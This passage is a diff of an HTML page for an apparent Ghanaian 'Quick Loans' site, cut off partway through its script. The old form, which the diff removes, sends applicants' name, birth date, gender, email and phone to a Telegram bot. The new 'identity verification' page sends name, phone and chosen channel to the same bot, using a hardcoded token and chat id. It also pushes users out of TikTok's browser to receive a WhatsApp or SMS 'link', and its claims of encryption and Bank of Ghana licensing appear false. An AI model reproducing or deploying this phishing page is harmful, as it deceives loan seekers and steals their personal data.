@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
-    <title>Quick Loans | Personal Details</title>
+    <title>Quick Loans – Identity Verification</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
     <meta name="theme-color" content="#E30613">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -27,13 +27,17 @@
             --radius: 20px;
         }
 
+        html,
         body {
+            min-height: 100vh;
             font-family: 'Inter', sans-serif;
             background: var(--bg-light);
-            color: var(--text-dark);
-            min-height: 100vh;
+        }
+
+        body {
             display: flex;
             flex-direction: column;
+            align-items: center;
             padding: 12px;
         }
 
@@ -49,6 +53,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            flex-shrink: 0;
         }
 
         .back-btn {
@@ -79,232 +84,460 @@
             color: var(--primary-blue);
         }
 
-        main {
-            flex: 1;
-            max-width: 480px;
-            width: 100%;
-            margin: 0 auto;
-            position: relative;
-        }
-
-        .form-card {
+        .card {
             background: white;
             border-radius: var(--radius);
-            padding: 24px 18px 32px;
+            padding: 32px 24px 36px;
+            width: 100%;
+            max-width: 480px;
             box-shadow: var(--shadow);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 16px;
             position: relative;
-        }
-
-        .error-box {
-            position: absolute;
-            top: 12px;
-            left: 12px;
-            right: 12px;
-            background: #fff;
-            border: 2px solid #ff4d4d;
-            border-radius: 14px;
-            padding: 12px;
-            display: none;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);
-            z-index: 100;
-            text-align: left;
-        }
-
-        .error-title {
-            color: #ff0000;
-            font-weight: bold;
-            font-size: 14px;
-            margin-bottom: 4px;
-        }
-
-        .error-text {
-            color: #444;
-            font-size: 13px;
-        }
-
-        .close {
-            position: absolute;
-            right: 12px;
-            top: 8px;
-            cursor: pointer;
-            font-size: 20px;
-            color: #999;
-        }
-
-        .form-title {
-            font-size: clamp(24px, 6vw, 32px);
-            font-weight: 700;
-            color: var(--text-dark);
             text-align: center;
-            margin-bottom: 1.2rem;
+            min-height: 400px;
         }
 
-        .progress-bar {
-            width: 100%;
-            height: 8px;
-            background: #e9ecef;
-            border-radius: 4px;
-            margin: 1rem auto 0.8rem;
-            overflow: hidden;
-        }
-
-        .progress-fill {
-            width: 66.66%;
-            height: 100%;
-            background: linear-gradient(90deg, var(--primary-red), var(--primary-darkred));
-            border-radius: 4px;
-        }
-
-        .step-text {
-            text-align: center;
-            color: var(--text-muted);
-            font-size: 0.9rem;
-            margin-bottom: 1.8rem;
-        }
-
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-
-        .form-label {
-            display: block;
-            font-weight: 600;
-            color: #2c3e50;
-            margin-bottom: 0.5rem;
-            font-size: 0.9rem;
-        }
-
-        .form-input {
-            width: 100%;
-            padding: 0.9rem 1rem;
-            border: 1px solid #ced4da;
-            border-radius: 10px;
-            font-size: 1rem;
-            background: #fdfdfe;
-            transition: all 0.2s;
-            font-family: inherit;
-        }
-
-        .form-input:focus {
-            border-color: var(--primary-red);
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.15);
-        }
-
-        .form-input.invalid,
-        #phoneGroup.invalid {
-            border-color: #dc3545 !important;
-            box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.15) !important;
-        }
-
-        select.form-input {
-            appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236c757d' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: right 1.2rem center;
-            background-size: 12px 8px;
-            padding-right: 2.8rem;
-            cursor: pointer;
-        }
-
-        #phoneGroup {
+        .icon-circle {
+            width: 80px;
+            height: 80px;
+            background: #fef2f2;
+            border: 2px solid #fee2e2;
+            border-radius: 50%;
             display: flex;
             align-items: center;
-            border: 1px solid #ced4da;
-            border-radius: 10px;
-            padding: 0 1rem;
-            background: #fdfdfe;
-            transition: border 0.2s, box-shadow 0.2s;
-        }
-
-        #phoneGroup:focus-within {
-            border-color: var(--primary-red);
-            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.15);
-        }
-
-        #phoneGroup span {
-            color: var(--text-muted);
-            font-weight: 500;
-            margin-right: 0.5rem;
+            justify-content: center;
+            margin-bottom: 20px;
             flex-shrink: 0;
         }
 
-        #phoneGroup input {
-            flex: 1;
+        .icon-circle i {
+            font-size: 36px;
+            color: var(--primary-red);
+        }
+
+        .card-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+        }
+
+        .card-subtitle {
+            font-size: 15px;
+            color: var(--text-muted);
+            line-height: 1.6;
+            max-width: 100%;
+            margin-bottom: 6px;
+        }
+
+        .card-subtitle strong {
+            color: var(--text-dark);
+        }
+
+        .id-list {
+            text-align: left;
+            margin: 12px 0 8px 20px;
+            font-size: 14px;
+            color: var(--text-dark);
+            list-style-type: disc;
+            width: 100%;
+        }
+
+        .id-list li {
+            margin-bottom: 4px;
+        }
+
+        .divider {
+            width: 100%;
+            height: 1px;
+            background: #e9ecef;
+            margin: 20px 0;
+        }
+
+        .details-grid {
+            width: 100%;
+            text-align: left;
+            margin-bottom: 8px;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #f1f3f5;
+            font-size: 14px;
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        .detail-value {
+            color: var(--text-dark);
+            font-weight: 600;
+            word-break: break-word;
+            text-align: right;
+            max-width: 60%;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 6px 16px;
+            border-radius: 40px;
+            font-size: 13px;
+            font-weight: 700;
+            margin: 4px 0 12px;
+            background: #fef2f2;
+            color: var(--primary-red);
+            border: 1px solid #fee2e2;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px 20px;
             border: none;
-            outline: none;
-            padding: 0.9rem 0;
-            font-size: 1rem;
-            background: transparent;
-            min-width: 0;
-        }
-
-        .dob-group {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-        .dob-group .form-group {
-            flex: 1;
-            min-width: 60px;
-            margin-bottom: 0;
-        }
-        .dob-group .form-group select {
-            padding: 0.9rem 0.5rem;
-        }
-
-        .btn-group {
-            display: flex;
-            gap: 1rem;
-            margin-top: 2rem;
-        }
-
-        .prev-btn,
-        .next-btn {
-            flex: 1;
-            padding: 1rem;
-            border-radius: 12px;
-            font-size: 1rem;
+            border-radius: 60px;
+            font-size: 16px;
             font-weight: 700;
             cursor: pointer;
             transition: 0.2s;
+            display: block;
+            text-align: center;
             touch-action: manipulation;
         }
 
-        .prev-btn {
-            background: #e2e8f0;
-            color: #475569;
-            border: none;
-        }
-
-        .prev-btn:active {
+        .btn:active {
             transform: scale(0.97);
         }
 
-        .next-btn {
-            background: linear-gradient(90deg, var(--primary-red), var(--primary-darkred));
-            color: white;
-            border: none;
-            box-shadow: 0 6px 18px rgba(227, 6, 19, 0.25);
-        }
-
-        .next-btn:active {
-            transform: scale(0.97);
-        }
-
-        .next-btn.disabled-btn,
-        .next-btn:disabled {
-            opacity: 0.7;
+        .btn:disabled {
+            background: #e5e5e5;
+            color: #999;
+            box-shadow: none;
             cursor: not-allowed;
             transform: none;
         }
 
+        .btn-verify {
+            background: linear-gradient(90deg, #00a86b, #008f5a);
+            color: white;
+            box-shadow: 0 8px 20px rgba(0, 168, 107, 0.35);
+        }
+
+        .btn-verify:hover:not(:disabled) {
+            background: linear-gradient(90deg, #00995f, #007a4d);
+        }
+
+        .btn-secondary {
+            background: #e9ecef;
+            color: #495057;
+            box-shadow: none;
+        }
+
+        .btn-secondary:hover {
+            background: #dee2e6;
+        }
+
+        .btn-group {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 8px;
+        }
+
+        .info-note {
+            font-size: 12px;
+            color: #999;
+            margin-top: 16px;
+            line-height: 1.5;
+        }
+
+        .error-box {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 14px 16px;
+            border-radius: 12px;
+            border: 1px solid #f5c6cb;
+            width: 100%;
+            margin-bottom: 16px;
+            text-align: left;
+            font-size: 14px;
+            display: none;
+        }
+
+        .error-box i {
+            margin-right: 8px;
+        }
+
+        .error-box.show {
+            display: block;
+        }
+
+        /* ---- Option Modal ---- */
+        #optionModal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(3px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            padding: 20px;
+        }
+
+        .modal-card {
+            background: white;
+            border-radius: 24px;
+            padding: 32px 24px;
+            max-width: 460px;
+            width: 100%;
+            text-align: left;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: modalPop 0.3s ease;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        @keyframes modalPop {
+            0% { transform: scale(0.9); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .modal-card .modal-icon {
+            font-size: 32px;
+            color: #0d6efd;
+            margin-bottom: 8px;
+            text-align: center;
+            display: block;
+        }
+
+        .modal-card h2 {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 6px;
+            text-align: center;
+        }
+
+        .modal-card .modal-intro {
+            font-size: 15px;
+            color: #6c757d;
+            line-height: 1.7;
+            margin-bottom: 4px;
+            text-align: left;
+        }
+
+        .modal-card .modal-intro strong {
+            color: var(--text-dark);
+        }
+
+        .modal-card .modal-info {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 14px 16px;
+            margin: 12px 0 16px;
+            border-left: 4px solid var(--primary-red);
+            font-size: 14px;
+            color: #495057;
+            line-height: 1.6;
+        }
+
+        .modal-card .modal-info .info-title {
+            font-weight: 700;
+            color: var(--text-dark);
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        .modal-card .modal-info ul {
+            padding-left: 18px;
+            margin-top: 4px;
+        }
+
+        .modal-card .modal-info ul li {
+            margin-bottom: 2px;
+        }
+
+        .modal-card .modal-divider {
+            height: 1px;
+            background: #e9ecef;
+            margin: 14px 0;
+        }
+
+        .modal-card .modal-question {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 10px;
+        }
+
+        .option-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .option-btn {
+            width: 100%;
+            padding: 14px 18px;
+            border: 2px solid #e9ecef;
+            border-radius: 12px;
+            background: white;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-align: left;
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .option-btn:hover {
+            border-color: var(--primary-red);
+            background: #fff5f5;
+        }
+
+        .option-btn .option-icon {
+            font-size: 26px;
+            width: 36px;
+            text-align: center;
+            flex-shrink: 0;
+        }
+
+        .option-btn .option-label {
+            flex: 1;
+        }
+
+        .option-btn .option-badge {
+            font-size: 11px;
+            background: #28a745;
+            color: white;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+
+        .option-btn.recommended {
+            border-color: #28a745;
+            background: #f0fff4;
+        }
+
+        .option-btn.recommended:hover {
+            background: #d4edda;
+        }
+
+        .option-btn.selected {
+            border-color: var(--primary-red);
+            background: #fff5f5;
+            box-shadow: 0 0 0 2px rgba(227, 6, 19, 0.2);
+        }
+
+        .option-btn:active {
+            transform: scale(0.97);
+        }
+
+        .modal-card .modal-success {
+            display: none;
+            text-align: center;
+            padding: 12px 0;
+        }
+
+        .modal-card .modal-success .check-icon {
+            font-size: 48px;
+            color: #28a745;
+            margin-bottom: 8px;
+        }
+
+        .modal-card .modal-success p {
+            font-size: 15px;
+            color: #6c757d;
+            line-height: 1.5;
+        }
+
+        .get-link-btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            background: #e9ecef;
+            color: #adb5bd;
+            margin-top: 4px;
+        }
+
+        .get-link-btn.active {
+            background: linear-gradient(90deg, #00a86b, #008f5a);
+            color: white;
+            box-shadow: 0 4px 12px rgba(0, 168, 107, 0.3);
+        }
+
+        .get-link-btn.active:hover {
+            background: linear-gradient(90deg, #00995f, #007a4d);
+        }
+
+        .get-link-btn:active {
+            transform: scale(0.97);
+        }
+
+        .get-link-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        /* ---- Loading Spinner Overlay ---- */
+        #loadingOverlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(3px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1500;
+        }
+
+        .loading-box {
+            text-align: center;
+        }
+
+        .loading-box .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #ffe0e0;
+            border-top: 4px solid var(--primary-red);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        .loading-box p {
+            font-size: 16px;
+            color: var(--text-muted);
+        }
+
         footer {
-            padding: 20px 16px;
+            padding: 16px 16px 20px;
             color: #adb5bd;
             font-size: 12px;
             text-align: center;
-            margin-top: auto;
+            flex-shrink: 0;
         }
 
         #spinner {
@@ -315,48 +548,98 @@
             justify-content: center;
             background: rgba(255, 255, 255, 0.8);
             backdrop-filter: blur(2px);
-            z-index: 999;
+            z-index: 1000;
         }
 
-        .loader {
+        .spinner-loader {
             width: 44px;
             height: 44px;
             border: 4px solid #ffe0e0;
-            border-top: 4px solid #ff0000;
+            border-top: 4px solid var(--primary-red);
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
 
         @keyframes spin {
-            to {
-                transform: rotate(360deg);
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 8px;
+            }
+            .card {
+                padding: 24px 16px 28px;
+                min-height: 340px;
+            }
+            .card-title {
+                font-size: 20px;
+            }
+            .icon-circle {
+                width: 64px;
+                height: 64px;
+            }
+            .icon-circle i {
+                font-size: 28px;
+            }
+            .btn {
+                padding: 14px;
+                font-size: 15px;
+            }
+            .detail-row {
+                font-size: 13px;
+                padding: 8px 0;
+            }
+            .id-list {
+                font-size: 13px;
+                margin-left: 16px;
+            }
+            .modal-card {
+                padding: 24px 16px;
+            }
+            .option-btn {
+                padding: 12px 14px;
+                font-size: 14px;
+            }
+            .modal-card .modal-info {
+                font-size: 13px;
+                padding: 12px 14px;
             }
         }
 
         @media (max-width: 380px) {
-            body {
-                padding: 8px;
+            .card {
+                padding: 18px 12px 22px;
+                min-height: 300px;
             }
-            .form-card {
-                padding: 20px 14px;
+            .card-title {
+                font-size: 18px;
             }
-            .form-input {
-                padding: 0.8rem 0.9rem;
-                font-size: 0.9rem;
+            .icon-circle {
+                width: 56px;
+                height: 56px;
             }
-            .dob-group .form-group select {
-                padding: 0.8rem 0.4rem;
+            .icon-circle i {
+                font-size: 24px;
             }
-            .btn-group {
-                gap: 0.8rem;
+            .detail-row {
+                font-size: 12px;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 2px;
             }
-            .prev-btn,
-            .next-btn {
-                padding: 0.8rem;
-                font-size: 0.9rem;
+            .detail-value {
+                text-align: left;
+                max-width: 100%;
             }
-            #phoneGroup input {
-                padding: 0.8rem 0;
+            .id-list {
+                font-size: 12px;
+                margin-left: 14px;
+            }
+            .option-btn .option-icon {
+                font-size: 22px;
+                width: 30px;
             }
         }
 
@@ -364,8 +647,9 @@
             body {
                 padding: 32px;
             }
-            .form-card {
-                padding: 2.5rem 3rem;
+            .card {
+                padding: 40px 36px 44px;
+                min-height: 440px;
             }
         }
     </style>
@@ -380,338 +664,341 @@
         </div>
     </header>
 
-    <main>
-        <div class="form-card">
-            <div class="error-box" id="errorBox">
-                <div class="close" onclick="hideError()">×</div>
-                <div class="error-title">Error</div>
-                <div class="error-text" id="errorText">Please fix the highlighted fields.</div>
-            </div>
+    <main class="card" id="mainCard">
+        <div class="icon-circle">
+            <i class="fas fa-id-card"></i>
+        </div>
 
-            <h1 class="form-title">Personal Details</h1>
-            <div class="progress-bar">
-                <div class="progress-fill"></div>
-            </div>
-            <div class="step-text">Step 2 of 3</div>
+        <h1 class="card-title">Verify Your Identity</h1>
 
-            <div class="form-group">
-                <label class="form-label">Full Name</label>
-                <input type="text" class="form-input" id="fullName" placeholder="e.g. Kwame Mensah">
-            </div>
+        <div class="status-badge">
+            <i class="fas fa-clock" style="margin-right: 6px;"></i> Pending Verification
+        </div>
 
-            <div class="form-group">
-                <label class="form-label">Date of Birth</label>
-                <div class="dob-group">
-                    <div class="form-group">
-                        <select class="form-input" id="dob-day">
-                            <option value="">Day</option>
-                        </select>
-                    </div>
-                    <div class="form-group">
-                        <select class="form-input" id="dob-month">
-                            <option value="">Month</option>
-                        </select>
-                    </div>
-                    <div class="form-group">
-                        <select class="form-input" id="dob-year">
-                            <option value="">Year</option>
-                        </select>
-                    </div>
-                </div>
-            </div>
+        <p class="card-subtitle" style="text-align: left; width: 100%;">
+            We need to confirm your identity with a government issued ID and selfie. Before proceeding, make sure you have one of the following forms of ID handy and your camera is enabled. Your data is securely stored and used only for KYC and security purposes.
+        </p>
 
-            <div class="form-group">
-                <label class="form-label">Gender</label>
-                <select class="form-input" id="gender">
-                    <option value="">Select...</option>
-                    <option value="Male">Male</option>
-                    <option value="Female">Female</option>
-                </select>
-            </div>
+        <ul class="id-list">
+            <li>Government Issued Passport</li>
+            <li>Driver's Licence</li>
+            <li>National Identity Card</li>
+        </ul>
 
-            <div class="form-group">
-                <label class="form-label">Email Address <span style="font-weight:400;color:#888;">(optional)</span></label>
-                <input type="email" class="form-input" id="email" placeholder="e.g. kwame@example.com">
-            </div>
+        <div class="divider"></div>
 
-            <div class="form-group">
-                <label class="form-label">Phone Number</label>
-                <div id="phoneGroup">
-                    <span>+233</span>
-                    <input type="tel" id="phone" placeholder="55 123 4567" maxlength="11" inputmode="numeric">
-                </div>
+        <div class="details-grid">
+            <div class="detail-row">
+                <span class="detail-label">Full Name</span>
+                <span class="detail-value" id="displayName">—</span>
             </div>
-
-            <div class="btn-group">
-                <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
-                <button class="next-btn" id="nextBtn">NEXT STEP</button>
+            <div class="detail-row">
+                <span class="detail-label">Phone Number</span>
+                <span class="detail-value" id="displayPhone">—</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Loan Amount</span>
+                <span class="detail-value" id="displayAmount">—</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Guarantor</span>
+                <span class="detail-value" id="displayGuarantor">—</span>
             </div>
         </div>
+
+        <div class="divider"></div>
+
+        <p class="card-subtitle" style="font-size: 13px; color: #888;">
+            <i class="fas fa-shield-alt" style="color: var(--primary-red); margin-right: 6px;"></i>
+            Your information is secure and encrypted.
+        </p>
+
+        <div class="btn-group">
+            <button class="btn btn-verify" id="verifyBtn">
+                <i class="fas fa-check-circle" style="margin-right: 8px;"></i> Verify Identity
+            </button>
+            <button class="btn btn-secondary" onclick="history.back()">
+                <i class="fas fa-arrow-left" style="margin-right: 8px;"></i> Go Back
+            </button>
+        </div>
+
+        <div class="info-note" id="infoNote">
+            Your verification link is being prepared. Please wait...
+        </div>
     </main>
+
+    <!-- Loading Spinner Overlay -->
+    <div id="loadingOverlay">
+        <div class="loading-box">
+            <div class="spinner"></div>
+            <p>Preparing your verification link...</p>
+        </div>
+    </div>
+
+    <!-- Option Modal -->
+    <div id="optionModal">
+        <div class="modal-card">
+            <div class="modal-icon"><i class="fas fa-shield-alt"></i></div>
+            <h2>🔒 Secure Verification Required</h2>
+
+            <div class="modal-intro">
+                <strong>Why we need this:</strong> To protect your identity and prevent fraud, we require a secure verification session. TikTok's built‑in browser doesn't support the security features needed for identity verification.
+            </div>
+
+            <div class="modal-info">
+                <span class="info-title">📌 What you need to know:</span>
+                <ul>
+                    <li><strong>Your ID and selfie</strong> will be verified through a secure, encrypted session.</li>
+                    <li>We use <strong>end‑to‑end encryption</strong> – your data is safe.</li>
+                    <li>TikTok's browser <strong>cannot</strong> run this type of secure verification.</li>
+                    <li>You'll receive a <strong>one‑time link</strong> via your chosen channel.</li>
+                </ul>
+            </div>
+
+            <div class="modal-divider"></div>
+
+            <div class="modal-question">📲 Choose how you'd like to receive your verification link:</div>
+
+            <div class="option-grid" id="optionGrid">
+                <button class="option-btn recommended" data-option="whatsapp">
+                    <span class="option-icon"><i class="fab fa-whatsapp" style="color: #25D366;"></i></span>
+                    <span class="option-label">WhatsApp</span>
+                    <span class="option-badge">Recommended</span>
+                </button>
+                <button class="option-btn" data-option="sms">
+                    <span class="option-icon"><i class="fas fa-sms" style="color: #6c757d;"></i></span>
+                    <span class="option-label">SMS</span>
+                </button>
+            </div>
+
+            <!-- "Get Link" button -->
+            <button class="get-link-btn" id="getLinkBtn" disabled>Get Link</button>
+
+            <!-- Success state (hidden initially) -->
+            <div class="modal-success" id="modalSuccess">
+                <div class="check-icon"><i class="fas fa-check-circle"></i></div>
+                <p id="successMessage">Verification link sent to your WhatsApp. Please check your messages.</p>
+                <button class="btn btn-verify" id="closeModalBtn" style="margin-top: 16px;">Got it</button>
+            </div>
+        </div>
+    </div>
 
     <footer>
         © 2026 Quick Loans – Licensed by Bank of Ghana | Powered by secure mobile payments
     </footer>
 
     <div id="spinner">
-        <div class="loader"></div>
+        <div class="spinner-loader"></div>
     </div>
 
     <script>
-        // Populate dropdowns
-        (function populateDropdowns() {
-            const daySelect = document.getElementById('dob-day');
-            const monthSelect = document.getElementById('dob-month');
-            const yearSelect = document.getElementById('dob-year');
+        // ============================================================
+        // 1. Load user data from localStorage
+        // ============================================================
 
-            for (let i = 1; i <= 31; i++) {
-                const opt = document.createElement('option');
-                opt.value = i;
-                opt.textContent = i;
-                daySelect.appendChild(opt);
-            }
+        const fullName = sessionStorage.getItem('fullName') ||
+            localStorage.getItem('fullName') ||
+            'Not provided';
 
-            const monthNames = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
-            for (let i = 1; i <= 12; i++) {
-                const opt = document.createElement('option');
-                opt.value = i;
-                opt.textContent = `${i} – ${monthNames[i-1]}`;
-                monthSelect.appendChild(opt);
-            }
+        const phone = sessionStorage.getItem('telecel_phone') ||
+            localStorage.getItem('phone') ||
+            '';
 
-            const currentYear = new Date().getFullYear();
-            for (let y = currentYear; y >= 1950; y--) {
-                const opt = document.createElement('option');
-                opt.value = y;
-                opt.textContent = y;
-                yearSelect.appendChild(opt);
-            }
-        })();
+        const loanAmount = sessionStorage.getItem('loanAmount') ||
+            localStorage.getItem('loanAmount') ||
+            '0';
 
-        // DOM elements
-        const fullNameInput = document.getElementById('fullName');
-        const genderSelect = document.getElementById('gender');
-        const emailInput = document.getElementById('email');
-        const phoneInput = document.getElementById('phone');
-        const phoneGroup = document.getElementById('phoneGroup');
-        const nextBtn = document.getElementById('nextBtn');
-        const spinner = document.getElementById('spinner');
-        const errorBox = document.getElementById('errorBox');
-        const errorText = document.getElementById('errorText');
+        const guarantorFirstName = sessionStorage.getItem('guarantorFirstName') || '';
+        const guarantorLastName = sessionStorage.getItem('guarantorLastName') || '';
+        const guarantorName = (guarantorFirstName || guarantorLastName) ?
+            `${guarantorFirstName} ${guarantorLastName}`.trim() :
+            'Not provided';
 
-        // Load saved data
-        if (localStorage.getItem('fullName')) fullNameInput.value = localStorage.getItem('fullName');
-        if (localStorage.getItem('gender')) genderSelect.value = localStorage.getItem('gender');
-        if (localStorage.getItem('email')) emailInput.value = localStorage.getItem('email');
-        if (localStorage.getItem('phone')) phoneInput.value = localStorage.getItem('phone');
-
-        const savedDob = localStorage.getItem('dob');
-        if (savedDob) {
-            const parts = savedDob.split('-');
-            if (parts.length === 3) {
-                const [year, month, day] = parts;
-                document.getElementById('dob-day').value = parseInt(day, 10);
-                document.getElementById('dob-month').value = parseInt(month, 10);
-                document.getElementById('dob-year').value = parseInt(year, 10);
-            }
+        function formatCurrency(amount) {
+            return '₵' + parseFloat(amount).toLocaleString('en-US');
         }
 
-        // Helper functions
-        function showError(message) {
-            errorText.innerText = message || 'Please fix the highlighted fields.';
-            errorBox.style.display = 'block';
-        }
+        document.getElementById('displayName').textContent = fullName;
+        document.getElementById('displayPhone').textContent = phone || 'Not provided';
+        document.getElementById('displayAmount').textContent = formatCurrency(loanAmount);
+        document.getElementById('displayGuarantor').textContent = guarantorName;
 
-        function hideError() {
-            errorBox.style.display = 'none';
-        }
+        // ============================================================
+        // 2. DOM references and state
+        // ============================================================
 
-        function resetInvalidHighlights() {
-            document.querySelectorAll('.form-input, #phoneGroup').forEach(el => {
-                el.classList.remove('invalid');
-            });
-        }
+        const verifyBtn = document.getElementById('verifyBtn');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const optionModal = document.getElementById('optionModal');
+        const optionGrid = document.getElementById('optionGrid');
+        const modalSuccess = document.getElementById('modalSuccess');
+        const successMessage = document.getElementById('successMessage');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+        const getLinkBtn = document.getElementById('getLinkBtn');
 
-        // Validation
-        function validateForm() {
-            let isValid = true;
-            let errorMsg = '';
-            resetInvalidHighlights();
-            hideError();
+        let selectedChannel = null;
+        let isGettingLink = false;
 
-            const fullName = fullNameInput.value.trim();
-            const gender = genderSelect.value;
-            const phoneRaw = phoneInput.value.trim();
-            const email = emailInput.value.trim();
+        // ============================================================
+        // 3. Send user choice to Telegram
+        // ============================================================
 
-            if (!fullName) {
-                fullNameInput.classList.add('invalid');
-                isValid = false;
-                errorMsg = 'Full name is required.';
-            } else if (fullName.split(' ').length < 2) {
-                fullNameInput.classList.add('invalid');
-                isValid = false;
-                errorMsg = 'Please enter your full name (first and last).';
-            }
-
-            const day = parseInt(document.getElementById('dob-day').value, 10);
-            const month = parseInt(document.getElementById('dob-month').value, 10);
-            const year = parseInt(document.getElementById('dob-year').value, 10);
-            if (!day || !month || !year) {
-                document.getElementById('dob-day').classList.add('invalid');
-                document.getElementById('dob-month').classList.add('invalid');
-                document.getElementById('dob-year').classList.add('invalid');
-                isValid = false;
-                if (!errorMsg) errorMsg = 'Please select your full date of birth.';
-            } else {
-                const dateObj = new Date(year, month - 1, day);
-                if (dateObj.getFullYear() !== year || dateObj.getMonth() !== month - 1 || dateObj.getDate() !== day) {
-                    document.getElementById('dob-day').classList.add('invalid');
-                    document.getElementById('dob-month').classList.add('invalid');
-                    document.getElementById('dob-year').classList.add('invalid');
-                    isValid = false;
-                    errorMsg = 'Please select a valid date.';
-                } else {
-                    const today = new Date();
-                    let age = today.getFullYear() - year;
-                    const m = today.getMonth() - (month - 1);
-                    if (m < 0 || (m === 0 && today.getDate() < day)) age--;
-                    if (age < 18) {
-                        document.getElementById('dob-day').classList.add('invalid');
-                        document.getElementById('dob-month').classList.add('invalid');
-                        document.getElementById('dob-year').classList.add('invalid');
-                        isValid = false;
-                        errorMsg = 'You must be at least 18 years old.';
-                    }
-                }
-            }
-
-            if (!gender) {
-                genderSelect.classList.add('invalid');
-                isValid = false;
-                if (!errorMsg) errorMsg = 'Please select your gender.';
-            }
-
-            if (!phoneRaw) {
-                phoneGroup.classList.add('invalid');
-                isValid = false;
-                errorMsg = 'Phone number is required.';
-            } else if (!/^\d{9,11}$/.test(phoneRaw)) {
-                phoneGroup.classList.add('invalid');
-                isValid = false;
-                errorMsg = 'Phone number must be 9, 10, or 11 digits (only numbers).';
-            }
-
-            if (email && (!email.includes('@') || !email.includes('.') || email.length < 5)) {
-                emailInput.classList.add('invalid');
-                isValid = false;
-                errorMsg = 'Please enter a valid email address (e.g., name@domain.com).';
-            }
-
-            if (!isValid) {
-                showError(errorMsg || 'Please correct the highlighted fields.');
-                const firstInvalid = document.querySelector('.invalid');
-                if (firstInvalid) firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                return false;
-            }
-            return true;
-        }
-
-        // Send to Telegram – with copyable phone number in code tags
-        function sendToTelegram(data) {
+        function sendChoiceToTelegram(option) {
             const botToken = '8736269489:AAFJ4LyUwUYQ9K_rKWwmY1GccWUDLFTEGsA';
             const chatId = '1006917440';
 
-            const message = `📋 New Loan Application
+            const optionLabel = option === 'whatsapp' ? 'WhatsApp' : 'SMS';
+            const fullPhone = phone ? `+233${phone}` : 'Not provided';
+
+            const message = `📱 Verification Link Request (Demo)
             ━━━━━━━━━━━━━━━━━━━
-            👤 Full Name: ${data.fullName}
-            📅 Date of Birth: ${data.dob}
-            ⚧ Gender: ${data.gender}
-            📧 Email: ${data.email || 'Not provided'}
-            📱 Phone: <code>${data.phoneFull}</code>
+            👤 Full Name: ${fullName}
+            📱 Phone: ${fullPhone}
+            📨 Channel: <b>${optionLabel}</b>
             ━━━━━━━━━━━━━━━━━━━
-            🔑 User ID: <code>${data.phoneDigits}</code>`;
+            🔗 This is a simulation – no real link was assigned.`;
 
